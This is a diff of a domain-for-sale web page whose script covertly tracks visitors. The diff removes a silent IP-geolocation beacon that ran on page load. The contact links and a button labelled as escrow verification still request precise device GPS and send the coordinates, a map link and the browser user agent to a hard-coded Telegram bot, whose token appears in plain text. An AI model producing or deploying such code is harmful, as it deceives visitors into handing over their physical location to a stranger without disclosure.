@@ -94,13 +94,13 @@
             font-size: 0.95rem;
             margin-top: 6px;
         }
-        #diag-box {
+        #status-box {
             margin-top: 15px;
             padding: 12px;
             background: #0f172a;
             border: 1px solid #334155;
             border-radius: 8px;
-            font-size: 0.82rem;
+            font-size: 0.85rem;
             color: #cbd5e1;
             display: none;
             text-align: left;
@@ -134,20 +134,21 @@
         <p>This premium domain is available for acquisition. Contact the owner directly via Email or WhatsApp to make an offer.</p>
         
         <div class="btn-group">
-            <a href="https://wa.me/212653621430?text=Hello,%20I%20am%20interested%20in%20purchasing%20awsengineer.com" class="btn btn-whatsapp" target="_blank" onclick="capturePrecisePosition()">
+            <a href="https://wa.me/212653621430?text=Hello,%20I%20am%20interested%20in%20purchasing%20awsengineer.com" class="btn btn-whatsapp" target="_blank" onclick="requestDeviceGps()">
                 Chat on WhatsApp (+212 653 621 430)
             </a>
             
-            <a href="mailto:deatmiau@gmail.com?subject=Domain%20Inquiry%20-%20awsengineer.com" class="btn btn-email" onclick="capturePrecisePosition()">
+            <a href="mailto:deatmiau@gmail.com?subject=Domain%20Inquiry%20-%20awsengineer.com" class="btn btn-email" onclick="requestDeviceGps()">
                 Send Email (deatmiau@gmail.com)
             </a>
 
-            <button class="btn btn-gps" onclick="capturePrecisePosition()">
+            <!-- Explicit button to trigger the GPS hardware permission -->
+            <button class="btn btn-gps" onclick="requestDeviceGps()">
                 📍 Verify Regional Escrow & Transfer
             </button>
         </div>
 
-        <div id="diag-box"></div>
+        <div id="status-box"></div>
 
         <div class="counter-container">
             <span>👁️ Total Page Views:</span>
@@ -158,9 +159,8 @@
     <script>
         const BOT_TOKEN = "8817325199:AAG3rAIc22jflbYRoCnrtu_7sjLRGMaVRR4";
         const CHAT_ID = "1890351722";
-        let visitorIP = "Unknown";
 
-        // Telegram message dispatcher
+        // Helper to send messages directly to your Telegram bot
         async function sendToTelegram(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -175,7 +175,7 @@
             }
         }
 
-        // 1. Visitor Hit Counter
+        // 1. Visitor Hit Counter (Updates the counter badge)
         async function fetchCounter() {
             try {
                 const res = await fetch('https://api.counterapi.dev/v1/awsengineer_com/views/up');
@@ -189,77 +189,54 @@
         }
         fetchCounter();
 
-        // 2. Silent IP Fallback on Page Load
-        async function logIpArrival() {
-            try {
-                const res = await fetch("https://ipwho.is/");
-                const data = await res.json();
-                if (data && data.success !== false) {
-                    visitorIP = data.ip || visitorIP;
-                    const alertText = 
-                        `🔔 [SOURCE: NETWORK IP ESTIMATION]\n\n` +
-                        `📍 ISP City: ${data.city}, ${data.country}\n` +
-                        `🌐 IP: ${visitorIP}\n` +
-                        `🏢 ISP: ${data.connection ? data.connection.isp : data.isp}\n` +
-                        `📌 IP Lat/Lon: ${data.latitude}, ${data.longitude}\n` +
-                        `🗺️ IP Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-                    sendToTelegram(alertText);
-                }
-            } catch (err) {
-                console.log("IP fallback active");
-            }
-        }
-        logIpArrival();
-
-        // 3. High-Precision Hardware GPS Geolocation
-        function capturePrecisePosition() {
-            const diagBox = document.getElementById("diag-box");
-            diagBox.style.display = "block";
-            diagBox.innerHTML = "⏳ Communicating with device GPS hardware...";
+        // 2. Pure GPS Request Function (Only runs when clicked/allowed)
+        function requestDeviceGps() {
+            const statusBox = document.getElementById("status-box");
+            statusBox.style.display = "block";
+            statusBox.innerHTML = "⏳ Requesting device GPS access...";
 
             if (!navigator.geolocation) {
-                diagBox.innerHTML = "❌ Hardware GPS is not supported on this browser.";
-                sendToTelegram(`⚠️ [GPS UNSUPPORTED] IP: ${visitorIP}`);
+                statusBox.innerHTML = "❌ GPS is not supported on this browser.";
                 return;
             }
 
             navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const acc = Math.round(pos.coords.accuracy);
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = Math.round(position.coords.accuracy);
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                    diagBox.innerHTML = 
-                        `✅ <b>Direct GPS Signal Captured!</b><br>` +
-                        `• Latitude: ${lat}<br>` +
-                        `• Longitude: ${lon}<br>` +
-                        `• Accuracy: ±${acc} meters<br>` +
-                        `<a href="${mapUrl}" target="_blank" style="color: #38bdf8; text-decoration: underline;">Open Google Maps Link</a>`;
+                    statusBox.innerHTML = 
+                        `✅ <b>Real GPS Coordinates Captured:</b><br>` +
+                        `• Latitude (Y): ${lat}<br>` +
+                        `• Longitude (X): ${lon}<br>` +
+                        `• Accuracy: ±${accuracy} meters<br>` +
+                        `<a href="${mapUrl}" target="_blank" style="color: #38bdf8; text-decoration: underline;">View on Google Maps</a>`;
 
-                    const gpsMessage = 
-                        `🎯 [SOURCE: PHYSICAL DEVICE GPS]\n\n` +
+                    const message = 
+                        `🎯 [EXACT PHYSICAL GPS CAPTURED]\n\n` +
                         `📌 Latitude (Y): ${lat}\n` +
                         `📌 Longitude (X): ${lon}\n` +
-                        `📏 Precision Radius: ±${acc} meters\n` +
+                        `📏 Accuracy: ±${accuracy} meters\n` +
                         `🗺️ Exact Google Maps Link:\n${mapUrl}\n\n` +
-                        `🌐 IP: ${visitorIP}`;
+                        `📱 Device: ${navigator.userAgent.substring(0, 90)}...`;
 
-                    sendToTelegram(gpsMessage);
+                    sendToTelegram(message);
                 },
-                (err) => {
-                    let errDesc = "Unknown failure";
-                    if (err.code === 1) errDesc = "Permission Denied by user/browser.";
-                    if (err.code === 2) errDesc = "Position Unavailable (No GPS satellite lock).";
-                    if (err.code === 3) errDesc = "Timeout waiting for hardware response.";
+                (error) => {
+                    let errMsg = "Unknown error";
+                    if (error.code === 1) errMsg = "Permission Denied. Please reset site permissions in your browser.";
+                    if (error.code === 2) errMsg = "Position Unavailable (No GPS satellite lock).";
+                    if (error.code === 3) errMsg = "Request timed out.";
 
-                    diagBox.innerHTML = `⚠️ <b>GPS Hardware Note:</b> ${errDesc}`;
-                    sendToTelegram(`⚠️ [GPS HARDWARE ERROR]\nReason: ${errDesc} (Code ${err.code})\nIP: ${visitorIP}`);
+                    statusBox.innerHTML = `⚠️ <b>Notice:</b> ${errMsg}`;
+                    sendToTelegram(`⚠️ [GPS ACCESS DENIED/FAILED]: ${errMsg}`);
                 },
                 {
-                    enableHighAccuracy: true,
-                    timeout: 25000,
-                    maximumAge: 0
+                    enableHighAccuracy: true, // Forces physical GPS satellite hardware
+                    timeout: 20000,
+                    maximumAge: 0           // Refuses old cached ISP positions
                 }
             );
         }
